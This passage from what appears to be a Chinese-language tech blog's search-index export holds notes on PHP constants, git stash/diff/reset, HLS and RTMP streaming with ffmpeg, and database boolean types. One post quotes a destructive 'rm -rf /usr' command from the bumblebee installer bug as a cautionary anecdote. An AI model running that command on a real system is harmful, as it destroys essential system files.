石頭閒語](http://rocksaying.tw/archives/10814499.html)\n\n* [PHP 必須要知道的小細節 · PHP7 開發之道](https://imyoungyang.gitbooks.io/php7-study-group-notes/content/Chapter2/php-something-should-know.html)\n\n> define() vs const 常數定義\n> 最主要的原因是底層的不同\n    define() 是 run-time constants 而 const 是 compile-time constants.\n    define() 是 global scope 或者在某個 namespace，所以不能用來定義 class-scope 的常數。\n    define()可以用在 if() 但 const不能用在 if()\n\n看到這邊還真的不知道這兩個不太一樣orz\n\n* [PHP严重致命错误处理:php Fatal error: Cannot redeclare clas - 小星星程序员的个人空间 - 开源中国](https://my.oschina.net/u/1766067/blog/299888)\n\nfunction,class重複宣告會有問題\n\n* [PHP中的提升(Hoisting) | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/573568/)\n\n這篇有簡易測試Hoisting，不過我認為跟js的hoisting不一樣\n還有測試code\n```php\n$poor_function = function(){\n};\nvar_dump(function_exists('poor_function'));\n```\n這樣是沒有意義的\n可以參考下面裡面\n* [Use Variable as Function Name in PHP - Stack Overflow](https://stackoverflow.com/questions/8466473/use-variable-as-function-name-in-php)\n不過我有測試`var_dump($poor_function)`顯示是一個閉包\n\n\n* [PHP中定义常量的区别，define() vs. const - 简书](https://www.jianshu.com/p/a38b81433183)\n這邊有紀錄很多define()跟const差異\n\n\n其他要紀錄的\n* [PHP 底层的运行机制与原理 - 文章 - 伯乐在线](http://blog.jobbole.com/94475/)\n* [CGI、FastCGI和PHP-FPM关系图解 - 歪麦博客](https://www.awaimai.com/371.html?fbclid=IwAR1dC7s3yKPjJM-PdYTQoAudEkRpG17LgOXc-h1kM_I0K4ZzxHLGq9H2ML8)\n* [PHP function to generate v4 UUID - Stack Overflow](https://stackoverflow.com/questions/2040240/php-function-to-generate-v4-uuid)\n\n結論，我還是不懂PHP  QQ"},{"title":"bug永存重點小記 - 為什麼/usr會有bin資料夾","url":"%2Fblog%2F2018%2F11%2F14%2Fbug%E6%B0%B8%E5%AD%98%E9%87%8D%E9%BB%9E%E5%B0%8F%E8%A8%98-%E7%82%BA%E4%BB%80%E9%BA%BC-usr%E6%9C%83%E6%9C%89bin%E8%B3%87%E6%96%99%E5%A4%BE%2F","content":"\n回想當初，對/usr資料夾不太熟悉\n有發現有些/usr/bin跟/bin\n但不知道兩者差異\n今天讀了[bug 永存](http://jandan.net/2018/11/08/bug-feature.html)\n{% asset_link 1.png 備份圖 %}\n裡面考古了一堆東西\n有解除我心中的疑惑\n\n<!--more-->\n\n1. window不能用aux,com命名，就算有副檔名也不行\n程序員大型考古活動。明白了原來CON, PRN, AUX, NUL, COM1~9, LPT1~9。這些文件名windows都不能命名\n突然想到之前MySQL在window也不能設定table大小寫\n看來應該是系統的缺陷\n\n\n2. 為什麼 Linux 會有 /usr 這個文件夾?\n如果有新手問你為什麼，你要很裝逼的告訴他：/usr 下面放的都是不會影響系統正常運行的，而根目錄下面的都是最重要的。當你做緊急維護的時候，可以沒有 /usr，但不能沒有根目錄。\n\n神說：要有區別。所以第一個盤就用來放根目錄，作為開發系統用，而第二個硬盤就用來放用戶的東西，然後掛載到 /usr下面。用戶目錄下面就放的都是小東西，所以那可是 2.5 MB 近乎無限的空間啊(大霧)\n\n神說：我x！第一塊盤滿了！作為一個積極開發的系統， 肯定會生成大量的二進制文件，而各種 debug 的工具更是龐大無比。再買一塊 RK05 是可以的，就是沒錢而已。而似乎用戶目錄 /usr 不是很滿……\n\n神說：複製黏貼是神聖的。所以他們就把整個系統文件架構都複製了一份，黏貼到 /usr 下面， 所以就有了 /usr/bin, /usr/lib。但是哪些文件要移過來呢？肯定是那些不會影響系統啟動的啊，因為首先要啟動系統，然後再把 /usr 掛載到根目錄下面。\n\n神說：就這麼定了。於是直到 Ubuntu(一個流行的Linux)的最新版本 18.10，你系統裡面會有 /bin 和 /usr/bin，就是因為 45 年前**兩個極客買不起 2.5 MB 硬盤做出的決定**。\n\n這個太有趣啦XDD\n\n3. 下面 撒旦的報復\n神說： /usr 不重要。撒旦說：呵！\n隨著 Linux 的發展，大部分的軟件都放在 /usr 下面了。當然，都是一些不會影響系統啟動的程序；但是對於用戶來說，/usr的程序更好玩，更重要，例如 firefox (瀏覽器），utorrent（下載器），mpv （播放器）， firefox（賢者模式煎蛋器）……\n2014 年 bumblebee 作為一個 Linux 支持 Nvidia 顯卡的一個牛逼模式的軟件，向世人展示了什麼就「不重要」。在他們的安裝腳本中，不小心多寫一個空格，從\n「`\nrm -rf /usr/lib/nvidia-current/xorg/xorg\n「`\n變成了\n「`\nrm -rf /usr /lib/nvidia-current/xorg/xorg\n「`\n是不是你也沒看出來是什麼問題？就是在/usr 後多了一個空格，所以從刪除 /usr/lib/nvidia-current/xorg/xorg 變成了 刪除 /usr 和/lib/nvidia-current/xorg/xorg 兩個文件夾。\n整個/usr被刪除了，哀鴻遍野…… rm 作為 Linux 的殺器，是無法恢復的。煎蛋器就這麼不見了……\n\n這個也很有趣，但我相信發生在自己身上一定是悲劇orz\n\n","tags":["window"],"categories":["程式心法"]},{"title":"git commit 指定幾行 & git stash 查看差異內容","url":"%2Fblog%2F2018%2F11%2F14%2Fgit-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9%2F","content":"\n最近使用Socuretree，發現大部分功能都看懂了\n[Chocolatey Gallery | Sourcetree for Windows Enterprise 3.0.8](https://chocolatey.org/packages/SourceTree)\n但是我發現stash，可以看到裡面存甚麼東西\nSourcetree還有git add 指定行數到index\n這個看起來很方便\n不知道原生怎麼處理\n這邊筆記\n\n<!--more-->\n\n## git add -p\n\n```\n# To remove '-' lines, make them ' ' lines (context).\n# To remove '+' lines, delete them.\n# Lines starting with # will be removed\n```\n簡單來說\n'+'不想被add進去，要移除單行內容(如:vi dd)\n'-'不想被add進去，要取代' '(空白)(如:vi r 空白)\n\n## git stash show -p\n[Git diff against a stash - Stack Overflow](https://stackoverflow.com/questions/7677736/git-diff-against-a-stash)\n\n這樣就能看到差異了\n\n其實Sourcetree也真的算滿方便的東西\n雖然之前用小烏龜，看log都很方便用了\n\n\n\n## 番外vim筆記(單行上移/下移)方法\n\n:m+ = 把目前這一行往下移動一行\n:m-2 = 把目前這一行往上移動一行\n[Vim的操作小技巧 | 高見龍](https://kaochenlong.com/2011/12/28/vim-tips/)\n或者\nddkP  刪除單行 + 貼上  \n\n[请问vim如何移动当前行向上或向下？不用选中 - V2EX](https://www.v2ex.com/t/49043)\n\n多行我就沒有測試了\n[[实践OK]vi行移动：vim上下移动一行或一段代码，及回到最近修改位置的vim快捷键，回到倒数第二次修改的位置，vim一下知道所在行的函数名设置方法。在文件中快速查找光标处一样的单词。 - 向东博客 专注WEB应用 构架之美 --- 构架之美，在于尽态极妍 | 应用之美，在于药到病除 - 赢在IT，Playin' with IT,Focus on Killer Application,Marketing Meets Technology.](https://jackxiang.com/post/5113/)\n[在Vim，整行上下移动_vim_帮酷编程问答](http://hant.ask.helplib.com/vim/post_199787)\n\n最近為了`git rebase`，發現vim不會上移一行....\n特別找了一下\n\n[Vim | 高見龍](https://kaochenlong.com/2011/12/26/vim/)\n[爽爽快快學Vim(3) - Vim Plugins | 高見龍](https://kaochenlong.com/2012/06/01/screencast-3-vim-plugins/)\n\n## stash apply \n\n> 要把 Stash 撿回來用，除了 pop 之外，另一個指令是 apply：\n> \n> $ git stash apply stash@{0}\n> \n> 這是指會把 stash@{0} 這個 Stash 拿來套用在現在的分支上，但 Stash 不會刪除，還是會留在 Stash 列表上。所以你可把 pop 指令看成「apply Stash + drop Stash」。\n\n參考:[【狀況題】手邊的工作做到一半，臨時要切換到別的任務 - 為你自己學 Git | 高見龍](https://gitbook.tw/chapters/faq/stash.html)\n\n## 重新上 remote 新的分支\n\n最近分支命名錯誤，重新修改本地端分支名字\n`git branch -m [ branc_name ] `\n發現 `git push` 上到 remote 還是舊的名稱上面\n原因是 `--set-upstream` 已經設定過了\n必須重新修正\n`git push -u [remote name] [branch name]`\n可以下指令\n\n\n> git push -u github master 指令可以拆解成以下的指令\n> \n> $ git push github master\n> $ git checkout master\n> $ git branch -u github/master\n\n\n## 取消 remote branch 追蹤\n\ngit branch --unset-upstream\n\n取消當前分支\n\ngit branch --unset-upstream master  \n\n也能指定分支","tags":["git stash"],"categories":["Git"]},{"title":"hls影音串流小記","url":"%2Fblog%2F2018%2F11%2F13%2Fhls%E5%BD%B1%E9%9F%B3%E4%B8%B2%E6%B5%81%E5%B0%8F%E8%A8%98%2F","content":"\n最近看到網頁上的影音，他播放的時候不會全下載\n好奇就網頁爬了一下\n是用 hls 技術，雖然現在還沒有用到\n不過我還滿感一點興趣\n就查一些記錄，筆記筆記\n\n<!--more-->\n\n- [M3U8 串流影音 - 概念 與 下載 - NotFalse 技術客](https://notfalse.net/63/m3u8-intro)\n- [流媒体：ffmpeg 生成 HLS 的 m3u8 与 ts 片段 - 小雨伞漂流记 - 开源中国](https://my.oschina.net/ososchina/blog/828100)\n- [ffmpeg 常用基本命令(转) - wainiwann - 博客园](http://www.cnblogs.com/wainiwann/p/4128154.html)\n\n切割 hls 檔案\n`ffmpeg -i low_30.mp3 -c:a aac -b:a 64k -vn -hls_list_size 0 abc.m3u8`\n`ffmpeg -i eq_1.mp4 -vcodec copy -acodec copy ~~-vbsf h264_mp4toannexb~~ -hls_time 10 -hls_list_size 999999999 output.m3u8`\n`-vbsf h264_mp4toannexb` 拿掉就可以跑了\n雖然不知道甚麼問題，不過解決了\n\n- [Only one .ts file is generating while encoding mp3 file to m3u8 using ffmpeg - Stack Overflow](https://stackoverflow.com/questions/45367762/only-one-ts-file-is-generating-while-encoding-mp3-file-to-m3u8-using-ffmpeg)\n- [ffmpeg HTTP Live Streaming](https://jonlabelle.com/snippets/view/shell/ffmpeg-http-live-streaming)\n\n* [Albert 的筆記本: HLS (HTTP Live streams) 介紹](http://albert-oma.blogspot.com/2016/02/hls-http-live-streams.html)\n* [巴哈動畫瘋 跳過網站直抓 m3u8 (更新版 – 柏狗屁世界](https://bgpsekai.thisistap.com/%E9%9A%A8%E6%89%8B%E4%BA%82%E5%81%9A/2017/02/%E5%B7%B4%E5%93%88%E5%8B%95%E7%95%AB%E7%98%8B-%E8%B7%B3%E9%81%8E%E7%B6%B2%E7%AB%99%E7%9B%B4%E6%8A%93-m3u8-%E6%9B%B4%E6%96%B0/)\n* [SRS 中增加身份验证 - dlbtsoft - 博客园](https://www.cnblogs.com/hrybird/p/5125182.html)\n* [srs 身份认证«海底苍鹰(tank)博客](http://blog.51yip.com/server/1822.html)\n* [樹莓派架設 RTMP 串流（Streaming）伺服器，傳送即時攝影機影像 - G. T. Wang](https://blog.gtwang.org/iot/raspberry-pi-nginx-rtmp-server-live-streaming/)\n* [v2_CN_Home · ossrs/srs Wiki](https://github.com/ossrs/srs/wiki/v2_CN_Home)\n* [Directives · arut/nginx-rtmp-module Wiki](https://github.com/arut/nginx-rtmp-module/wiki/Directives)\n\n- [重启 php7-fpm 和 php5-fpm 方法大全 - 歪麦博客](https://www.awaimai.com/2391.html)\n- [三种主流流媒体协议(RTMP，RTSP，HTTP)比较 - 流媒体技术 - AMS- 为天下企业提供流媒体软件引擎！](http://www.avpk.cn/article/131.html)\n- [How can I display an RTSP video stream in a web page? - Stack Overflow](https://stackoverflow.com/questions/2245040/how-can-i-display-an-rtsp-video-stream-in-a-web-page)\n- [流媒体之 RTSP/RTP/RTCP | Winddoing's Blog](https://winddoing.github.io/post/34052.html)\n- [Setting up HLS live streaming server using NGINX - Peer5 Docs](https://docs.peer5.com/guides/setting-up-hls-live-streaming-server-using-nginx/)\n- [srs 身份认证«海底苍鹰(tank)博客](http://blog.51yip.com/server/1822.html)\n- [srs 流媒体服务器 安装配置«海底苍鹰(tank)博客](http://blog.51yip.com/server/1815.html)\n- [ffmpeg 处理 RTMP 流媒体的命令大全 - 雷霄骅(leixiaohua1020)的专栏 - CSDN 博客](https://blog.csdn.net/leixiaohua1020/article/details/12029543)\n- [ffmpeg 處理 RTMP 流媒體的命令和傳送流媒體的命令（UDP，RTP，RTMP） - 掃文資訊](https://tw.saowen.com/a/c003e14c9686e3a151be9203a48ccf662cff5ec90e5437e9e8b0c0c51e266371)\n\n[Nginx-rtmp 模块实现流媒体 play、push、pull 功能-Dream come true-51CTO 博客](http://blog.51cto.com/lyd0721/1429803)\n[直播技术实现(一)](http://www.dengshenyu.com/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/2016/09/05/live-streaming.html)\n[直播技术实现(二)](http://www.dengshenyu.com/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/2016/09/05/live-streaming-2.html)\n[筆記：使用 nginx 搭建一個 HLS(HTTP Live Streaming) & Rtmp 直播服務器 | 奈特的魔法科研](https://nat.moe/technologies/yinfb/973/)\n\n名詞簡單小記\n\n#### SRS(Simple RTMP Server)\n\n架設 RTMP Server\n簡單來說就是`直播伺服器`\n\n> 3、将其中一个直播流，视频改用 h264 压缩，音频不变，送至另外一个直播服务流\n> `ffmpeg -i rtmp://server/live/originalStream -c:a copy -c:v libx264 -vpre slow -f flv rtmp://server/live/h264Stream`\n> 當出看一直看不到為什麼 rtmp 傳到另一個 rtmp\n> 後來看到`直播服務流`\n> 就想到應該像 youtube,twitter\n> 讓我想到 obs 應該也是發到 rtmp server 去\n\n#### rtmp rstp hls(http live streaming)\n\n- [三种主流流媒体协议(RTMP，RTSP，HTTP)比较 - 流媒体技术 - AMS- 为天下企业提供流媒体软件引擎！](http://www.avpk.cn/article/131.html)\n\n```\n1、HTTP協議:\n HTTP的視頻協議，主要是在互聯網普及之後。在互聯網上看視頻的需求下形成的。\n   最初的HTTP視頻協議，沒有任何特別之處，就是通用的HTTP文件漸進式下載。本質就是下載視頻文件，而利用視頻文件本身的特點，就是存在頭部信息，和部分視頻幀數據，就完全可以解碼播放了。顯然這種方式需要將視頻文件的頭部信息放在文件的前面。有些例如faststart工具，就是專門做這個功能的。\n    但是最為原始的狀態下，視頻無法進行快進或者跳轉播放到文件尚未被下載到的部分。這個時候對HTTP協議提出了range-request的要求。這個目前幾乎所有HTTP的服務器都支持了。range-request，是請求文件的部分數據，指定偏移字節數。在視頻客戶端解析出視頻文件的頭部後，就可以判斷後續視頻相應的幀的位置了。或者根據碼率等信息，計算相應的為位置。\n\n優點：\nHTTP Live Streaming 還有一個巨大優勢：自適應碼率流播（adaptive streaming）。效果就是客戶端會根據網絡狀況自動選擇不同碼率的視頻流，條件允許的情況下使用高碼率，網絡繁忙的時候使用低碼率，並且自動在二者間隨意切換。這對移動設備網絡狀況不穩定的情況下保障流暢播放非常有幫助。實現方法是服務器端提供多碼率視頻流，並且在列表文件中註明，播放器根據播放進度和下載速度自動調整。使用起來也非常簡單。\n缺點：\n    實時性相對較差，直播的時候延遲比較高。當然，現在進化出來的flv_over_http或者ts_over_http也可以做到直播延時很低，基本和rtmp協議差不多。\n\n2、RTSP協議：\n用於Internet上針對多媒體數據流的一種傳輸協議，是TCP/IP協議體系中的一個應用層協議，RTSP在體系結構上位於RTP和RTCP之上，它使用TCP或UDP完成數據傳輸，該協議定義了一對多應用程序如何有效地通過IP網絡傳送多媒體數據。\n   本協議是最早的視頻傳輸協議。其中RTSP協議用於視頻點播的會話控制，例如發起點播請求的SETUP請求，進行具體播放操作的PLAY、PAUSE請求，視頻的跳轉也是通過PLAY請求的參數支持的。\n\n優點：\nRTSP協議族的優勢，在於可以控制到視頻幀，因此可以承載實時性很高的應用。這個優點是相對於HTTP方式的最大優點。H.323視頻會議協議，底層一般採用RTSP協議。RTSP協議族的複雜度主要集中在服務器端，因為服務器端需要parse視頻文件，seek到具體的視頻幀，而且可能還需要進行倍速播放（就是老舊的DVD帶的那種2倍速，4倍速播放的功能），倍速播放功能是RTSP協議獨有的，其他視頻協議都無法支持。\n缺點：\n就是服務器端的複雜度也比較高，實現起來也比較複雜。Ios端不支持該協議。\n\n3、RTMP協議：\n   RTMP是Real Time Messaging Protocol（實時消息傳輸協議）的首字母縮寫。RTMP(Real Time Messaging Protocol)實時消息傳送協議是Adobe Systems公司為Flash播放器和服務器之間音頻、視頻和數據傳輸 開發的開放協議。該協議基於TCP，是一個協議族，包括RTMP基本協議及RTMPT/RTMPS/RTMPE等多種變種。RTMP是一種設計用來進行實時數據通信的網絡協議，主要用來在Flash/AIR平台和支持RTMP協議的流媒體/交互服務器之間進行音視頻和數據通信。支持該協議的軟件包括Adobe Media Server/Aoku Media Server/red5/Wowza等。\n\n優點：\n\n支持直播、點播\n\n缺點:\n需要專用的服務器。\n\n三、協議對比\n關於三個RTMP，RTSP，HTTP的對比：\n1.RTMP是adobe的，RTSP是 android native支持，http協議。\n2.RTMP和HTTP有adaptive streaming的技術，RTSP沒有\n3.RTSP實時性是最好的，HTTP實時性比較差。\n4.ios不支持rtsp，安卓支持。\n\n四、總結\n  三種協議各有優缺點，rtmp協議應用範圍比較窄，一般客戶端需要用flash接收，rtsp一般常用於監控領域和對實時性要求比較高的場合，http的延伸hls用的比較多，一般用在移動終端觀看，一般一個成熟的流媒體服務系統都需要支持這三種協議，甚至更多的協議，比如udp組播，單播，或者p2p協議等。\n   Aoku Media Server是可以同時支持這三種流媒體協議的。是國內為數不多的專業流媒體服務系統，提供的免費版可以供用戶進行三種協議的測試對比\n```\n\n簡單來說，hls 是基於 http\n但是只有 apple 支援，所以 apple 裝置可以直接用\n要瀏覽器支援要用[video-dev/hls.js: JavaScript HLS client using Media Source Extension](https://github.com/video-dev/hls.js/)\n\n#### nginx-rtmp-module\n\n~~目前感覺就是跟 rtmp 與 rtmp server 串接用~~\n[Nginx-rtmp 模块实现流媒体 play、push、pull 功能-Dream come true-51CTO 博客](http://blog.51cto.com/lyd0721/1429803)\n{% asset_link 1.png 備份圖 %}\n\n```\n    Nginx RTMP Module - 架構在Nginx之上, 也算老牌了, 支援RTMP和HLS, 但看code base, 實在也沒啥在更新\n    Mona server - 支援RTMP, HTTP(非HLS), Web socket等等\n    Red5 Media Server - 支援RTMP, HLS, WebSocket, RTSP, 好像是要錢\n    Simpe RTMP Server - 這是由中國的觀止雲這家開源出來的, 講”Simple”其實一點都不Simple, 輕量, 穩定(至少我試直播一晚上都還蠻順利的), 好擴展(支援forward to edge), 可RTMP轉HLS, 因此我最後選擇這個方案\n```\n\n其實今天仔細找了一下，SRS 跟 nginx-rtmp-module 只要選其中一種就可以了\n參考來源:[[筆記] 中秋連假小實驗 – Le murmure de Julian](http://blog.jln.co/%E7%AD%86%E8%A8%98-%E4%B8%AD%E7%A7%8B%E9%80%A3%E5%81%87%E5%B0%8F%E5%AF%A6%E9%A9%97/)\n\n裡面寫的很詳細\n\n#### 影片/音樂傳流檔案\n\nmp2t for audio/video\nm3u8 for 多媒體列表檔案格式\n\n## hls 加密\n\n- [HLS 协议详解 · Akagi201](http://akagi201.org/post/hls-explained/)\n- [hls 加密 - Google 搜尋](https://www.google.com/search?client=firefox-b-d&q=hls+%E5%8A%A0%E5%AF%86)\n- [流媒体加密 · Issue #10 · gwuhaolin/blog](https://github.com/gwuhaolin/blog/issues/10)\n- [HLS 架构简介及播放加密的 HLS - Android - 掘金](https://juejin.im/entry/59f1884f6fb9a0452206ba93)\n\n雖然最近沒有打算做這個相關東西\n但是不知道為什麼對 hls 特別有興趣 XD\n越記越多，希望哪天有機會用到\n","tags":["ffmpeg"],"categories":["HTML"]},{"title":"DB到底有沒有boolean型態呢","url":"%2Fblog%2F2018%2F11%2F09%2FDB%E5%88%B0%E5%BA%95%E6%9C%89%E6%B2%92%E6%9C%89boolean%E5%9E%8B%E6%85%8B%E5%91%A2%2F","content":"\n最近做`SELECT TRUE` 在SQL的時候\n發現adminer跑出來結果是`1`\n覺得有點不科學\n\n<!--more-->\n\n在很久的時候，MySQL操作phpmyadmin設定欄位都會看到有boolean這個選項\n就以為boolean有這個東西\n由於過去大學專題java都是用rs.getBoolean(xxx)也沒有發現這個問題\n\n上一間公司是使用DB2都用varchar(1) [Y,N]\n所以沒有遇過這個問題\n\n今天遇到這個狀況有點錯愕orz\n覺得怪怪的\n\n最後網路查了一下，MySQL實做上會把boolean當tinyint(1)使用\n\n\nDB2剛好開docker玩\n下sql發現不能新增boolean欄位型態!!!\nGoogle一下發現db2沒有boolean型態\nsql server,db2 做`select True from xxxxx(依照db不能)`\n會產生錯誤\n\n這時候我就很好奇oracle,sql server到底有沒有這個東西(boolean)\n\n這邊簡單記錄\nmysql,postgres 有 boolean 型態\noracle,sql server, db2都不能用boolean\n\nSQL92建義用bit，但是oracle推使用number\n\n目前我同事是使用tinyint(1)，不過他也不知道sql server沒有boolean型態....\n\n可參考以下內容\n* [sql - Boolean vs tinyint(1) for boolean values in MySQL - Stack Overflow](https://stackoverflow.com/questions/3751853/boolean-vs-tinyint1-for-boolean-values-in-mysql)\n\n```\n其中， linq to sql 自然就將 IsRetired 欄位當成 boolean 值，0 是 false, 1 是 true. 這在 sql server 是相當自然而沒有疑慮的事情。 \n那在 Oracle 呢？Oracle 是資料庫的老大，當然不需要 follow 標準。(所以別怪 MS Office 不照 OpenDocument format (ODF) 的標準，而要自行搞一套 Office Open Xml 的標準) \nOracle 不支援 bit 的 datatype，甚至在 Oracle vs. SQL Server中也指明了，bit 的相等的oracle 表達法是 number(1, 0)。 \n是否我們需要存 boolean 值時，在oracle 就宣告成 number(1, 0) 呢？ \n將來如果出了一個 linq to oracle 的 privider，是否看到 number(1, 0) 就自行轉成 boolean 呢？ 看了很多前人的程式，都是自行定義的，如 char(1)，然後寫入值為 '0' 或 '1' ，也有寫成 'Y' 或 'N\"，當然也有 'y' 或 'n'。 \n實在令人頭痛。 \n如果是您，不知道您會如何宣告呢？\n```\n突然想到我上一間公司是使用db2\n那時候他們說只用`varchar`型態\nboolean幾乎都是用`Y`,`N`\n那時候也不知道為什麼...\n現在終於知道了\n只不過這樣註解是不是都要特別記?\n\n* [请问db2有boolean数据类型吗？？-CSDN论坛](https://bbs.csdn.net/topics/30054994)\n* [DB2中类似于ORACLE中的DUAL表的表 - Menjoy's 技术文摘 - ITeye博客](http://menjoy.iteye.com/blog/111737)\n* [程湘之間: Oracle 學習(3) boolean 的資料欄位](http://charlesbc.blogspot.com/2008/08/oracle-3-boolean.html)\n* [关于oracle的boolean问题 - mrdu_somefun的博客 - CSDN博客](https://blog.csdn.net/H12KJGJ/article/details/52785108)\n\n\n然後我翻我買的MySQL裡面也沒有提到Boolean這型態!!!!\n看來錯誤觀念要修正...","tags":["db2"],"categories":["SQL"]},{"title":"git查看兩個commit異動有哪些檔案和打包方法","url":"%2Fblog%2F2018%2F11%2F09%2Fgit%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95%2F","content":"\n最近有同事需要我異動有哪些檔案\n我找一個(方便)方法到用git看方法\n在這邊小記\n\n<!--more-->\n\n## git diff-tree\ngit diff-tree\n`git diff-tree --no-commit-id --name-only -r commit_id1 commit_id2`\n\n不過這個在我公司那台怪怪的\n我家電腦正常\n所以才找到下面這個方法\n\n## git diff \n`git diff --name-only  commit_id1 commit_id2`\n[Making git diff --stat show full file path - Stack Overflow](https://stackoverflow.com/questions/10459374/making-git-diff-stat-show-full-file-path)\n\n\n## 打包檔案方法\n\n```\ngit archive --format zip -o filename.zip HEAD\n```\n\n```\ngit archive --format zip -o $(git log --date=short --pretty=format:\"%ad\" -1).zip HEAD\n```\n\n```\n$ cat > ~/bin/git-zip\n#!/bin/sh\ngit archive --format zip -o $(git log --pretty=format:\"%h\" -1).zip HEAD\n$ chmod u+x ~/bin/git-zip\n$ cd git-repository\n$ git zip\n```\n以上範例參考如[git archive 與 log 小技巧 – Rex's blah blah blah](http://blog.nutsfactory.net/2010/02/01/git-archive-and-log/)\n感覺這東西以後還是會用的到\n\n\n更進階的用法:[如何讓Git匯出兩個Commit之間更新或新增的檔案 – 可達鴨村](http://lulualulu.com/%E5%A6%82%E4%BD%95%E8%AE%93git%E5%8C%AF%E5%87%BA%E5%85%A9%E5%80%8Bcommit%E4%B9%8B%E9%96%93%E6%9B%B4%E6%96%B0%E6%88%96%E6%96%B0%E5%A2%9E%E7%9A%84%E6%AA%94%E6%A1%88/)\n\n\nDate: 2018-12-15\n\n今天PM跟我要最近上傳更動幾個commit\n由於我們公司上傳git方式比較不一樣\n部屬程式導致有些commit有上線、有些沒有上線....\n\n剛好之前有記錄到[如何讓Git匯出兩個Commit之間更新或新增的檔案 – 可達鴨村](http://lulualulu.com/%E5%A6%82%E4%BD%95%E8%AE%93git%E5%8C%AF%E5%87%BA%E5%85%A9%E5%80%8Bcommit%E4%B9%8B%E9%96%93%E6%9B%B4%E6%96%B0%E6%88%96%E6%96%B0%E5%A2%9E%E7%9A%84%E6%AA%94%E6%A1%88/)\n\n裡面有\n```\n    echo Eport GitDiff\n    set /p input1=Export Start Commit ID: \n    set commitIdStart=%input1%\n    set /p input2=Export End Commit ID: \n    if [%input2%] ==[] (set commitIdEnd=HEAD) else (set commitIdEnd=%input2%)\n    echo Start ID = %commitIdStart%\n    echo End ID = %commitIdEnd%\n    for /f \"skip=1\" %%x in ('wmic os get localdatetime') do if not defined DateTime set DateTime=%%x\n    echo %DateTime%\n    set exportFolder=%DateTime:~0,4%%DateTime:~4,2%%DateTime:~6,2%_%DateTime:~8,6%\n    echo %exportFolder%\n    for /f \"usebackq tokens=*\" %%A in (`git diff-tree -r --no-commit-id --name-only --diff-filter=ACMRT %commitIdStart% %commitIdEnd%`) do echo FA|xcopy \"%%~fA\" \"GitExport\\%exportFolder%\\%%A\"\n    set /p DUMMY =Hit Enter To Continue....\n```\n這段就派上用場了\n\n我以為這些內容都是從commit提取出來\n但事實上不是這樣的\n其實是透過`git diff-tree`顯示commit 改動有哪些檔案\n然後她會從你現在本地端複製檔案到資料夾裡面，**不是從commit複製當時候的內容**\n所以使用上也要特別注意一下head現在狀態是不是你要打包的內容\n\n**上面敘述commit踩雷事項**\n因為上次實作，需要做兩個commit`commitIdStart`、`commitIdEnd`\n輸入完只有打包到兩個commit內容\n但是...其實第一個commit不會包到\n也就是放置兩個commit第一個commit不會算到\n為什麼呢?\n其實`git diff-tree`是比較兩個commit差異，所以第一個commit不會被比較到\n讓我想到rebase也是一樣\n\n**當不連續commit要怎麼辦**\n\nPM要求不練續的commit要怎麼辦?\n其實我覺得上面腳本只適合做連續commit\n但今天研究了一下\n其實透過上面腳本還是能做到啦\n\n只要改腳本  時間資料夾拿掉\n在多次執行腳本就可以了\n雖然還是沒反杜絕手動的錯誤\n但還是可以這樣用\n總比人工scp跟sftp是不樣的東西複製檔案好多了吧\n","tags":["git archive"],"categories":["Git"]},{"title":"git reset 和git reflog小記","url":"%2Fblog%2F2018%2F11%2F09%2Fgit-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98%2F","content":"\n最近在改程式，所以我重新上一個commit`git commit --amend`\n但做完發現...，我忘記做`git add xxx`了\n當下`Ctrl+C`都不能中斷\n只能QQ`:q!`or`:qa!`\n\n\n<!--more-->\n\n這種事當然要找一下解法\n\n## git reflog\n\n`git reflog`指令可以看最近刪除commit，之後會被自動刪除\n可依照commit說明去找上次的內容\n\n這時候想看reflog內容要怎麼看??\n這時候要用之前學得融會貫通XD\n`git checkout commit_id`\n這樣就能切換過去\n再`git diff`也能看到東西\n\n\n## git reset \n\n`git reset --hard commit_id`\n\n這樣就檢單還原\n\ngit reset --soft\ngit reset --mixed\n不過這指令記不時起來\n\n2018-11-12\n[大師常來聊-高見龍談 Git 版控之final12345](https://youtu.be/Hl4tuzqaFJk?t=3843) \n剛好最近寫這篇，剛好沒說很熟git reset，腦還中對這個印象沒有運作的概念\n今天剛好聽知這段，`goto,become`會比較容易理解\n\n[大師常來聊-高見龍談 Git 版控之final12345 - rebase合併](https://youtu.be/Hl4tuzqaFJk?t=5999) \n\n[大師常來聊-高見龍談 Git 版控之final12345 - git flow ](https://youtu.be/Hl4tuzqaFJk?t=9141)\n\n[大師常來聊-高見龍談 Git 版控之final12345 - git 沒模組化很容易衝突](https://youtu.be/Hl4tuzqaFJk?t=7509)\n在沒做模組拆分很容易發生衝突，如:index.html\n\n[大師常來聊-高見龍談 Git 版控之final12345 - git checkout file 跟 git reset HEAD --mixed 差別](https://youtu.be/Hl4tuzqaFJk?t=7887)\n\n[大師常來聊-高見龍談 Git 版控之final12345 - git PR 遇到衝突](https://youtu.be/Hl4tuzqaFJk?t=8806)\n\n其實下面兩個問題是我問題，希望之後實務上會用git更順利\n基本上有基礎，再看那個直播會更容易了解\n會看那個直播是剛好有買`為了你自己學git`，覺得書中內容不錯\n剛好參加Kuro研討會順便去天龍書店逛的\n好書!!就直接買了XD\n\n\n\nFB有看到簡易了解圖示\n[謝孟哲 - [git reset ...] 問題很簡單，有辦法把 cache 的內容寫回 working directory 嗎？...](https://www.facebook.com/photo.php?fbid=2418041491555969&set=gm.1944599088922083&type=3&theater&ifg=1)\n\n{% asset_img 1.jpg 簡易圖示 %}\n\n\n一直以為`git reflog`很難，一直沒有跨出這一步...\n但是今天遇到這個狀況，卻不小心邁進一大步XD\n","tags":["git"],"categories":["Git"]},{"title":"使用docker架設db2環境","url":"%2Fblog%2F2018%2F11%2F08%2F%E4%BD%BF%E7%94%A8docker%E6%9E%B6%E8%A8%ADdb2%E7%92%B0%E5%A2%83%2F","content":"\n最近要實驗boolean在db2\n會有什麼結果\n所以找找有沒有docker簡單架設方法\n可以在docker 